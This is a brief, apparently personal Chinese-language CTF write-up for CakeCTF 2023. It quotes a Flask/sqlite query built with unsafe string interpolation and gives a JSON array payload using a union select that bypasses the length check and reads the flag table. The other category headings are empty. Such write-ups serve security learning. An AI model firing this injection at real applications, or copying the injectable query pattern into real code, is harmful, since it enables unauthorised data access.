https://github.com/theoremoon/cakectf2023-public.git
# web
### Country DB
输入简写查询国家全称,
```python
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]
```
直接拼接,但是code有限制
```python
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")
```
len使用数组绕过,

---
思路是对的,但是没构造出来...下次一定努力
`{"code":["')union select flag from flag;#",""]}`

# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-11-16   23:14